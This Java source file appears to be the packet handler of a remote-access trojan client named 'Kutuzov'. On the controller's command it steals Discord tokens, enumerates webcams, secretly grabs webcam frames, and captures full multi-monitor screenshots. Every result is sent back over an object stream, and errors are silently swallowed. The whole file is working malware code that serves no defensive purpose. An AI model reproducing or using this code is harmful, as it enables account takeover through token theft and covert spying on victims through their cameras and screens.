package me.kutuzov.client;

import com.github.sarxos.webcam.Webcam;
import me.kutuzov.client.util.LoggingUtil;
import me.kutuzov.packet.Packet;
import me.kutuzov.packet.logger.*;
import me.kutuzov.packet.logger.types.TokenType;
import me.kutuzov.utils.ImageUtils;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.List;

public class KutuzovLoggerPackets {
    public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
        if(packet instanceof SCTokenRequest) {
            SCTokenRequest request = (SCTokenRequest) packet;
            try {
                switch (request.type) {
                    case DISCORD:
                        oos.writeObject(new CSTokenResponse(request.type, LoggingUtil.obtainDcTokens()));
                        break;

                    default:
                        oos.writeObject(new CSTokenResponse(TokenType.NONE, new String[0]));
                        break;
                }
            } catch (Exception exception) {
            }
        } else if(packet instanceof SCWebcamList) {
            try {
                List<Webcam> webcams = Webcam.getWebcams();
                String[] webcamNames = new String[webcams.size()];

                for (int i = 0; i < webcams.size(); i++)
                    webcamNames[i] = webcams.get(i).getName();
                oos.writeObject(new CSWebcamList(webcamNames));
            } catch (Exception exception) { }
        } else if(packet instanceof SCWebcamFrame) {
            try {
                SCWebcamFrame frame = (SCWebcamFrame) packet;
                Webcam webcam = Webcam.getWebcams().get(frame.webcamId);

                webcam.open();

                BufferedImage image = webcam.getImage();
                webcam.close();

                byte[] bytes = ImageUtils.toByteArray(image, "png");
                oos.writeObject(new CSWebcamFrame(bytes));

                image = null;
                bytes = null;
            } catch (Exception exception) { }
        } else if(packet instanceof SCScreenFrame) {
            try {
                GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
                GraphicsDevice[] gs = ge.getScreenDevices();

                int left = 0;
                for (int i = 0; i < gs.length; i++)
                    if(gs[i].getDefaultConfiguration().getBounds().x < gs[left].getDefaultConfiguration().getBounds().x)
                        left = i;

                GraphicsDevice[] ordered = new GraphicsDevice[gs.length];
                for (int i = 0; i < gs.length; i++)
                    ordered[i] = gs[(left + i) % gs.length];
                gs = ordered;

                Rectangle bounds = new Rectangle();
                for (GraphicsDevice screen : gs) {
                    Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
                    bounds.width += screenBounds.width;
                    bounds.height = Math.max(bounds.height, screenBounds.height);
                }

                BufferedImage image = new Robot().createScreenCapture(bounds);
                byte[] bytes = ImageUtils.toByteArray(image, "png");

                oos.writeObject(new CSScreenFrame(gs.length, bytes));

                image = null;
                bytes = null;
                gs = null;
                ordered = null;
                bounds = null;
            } catch (Exception exception) {}
        }
    }
}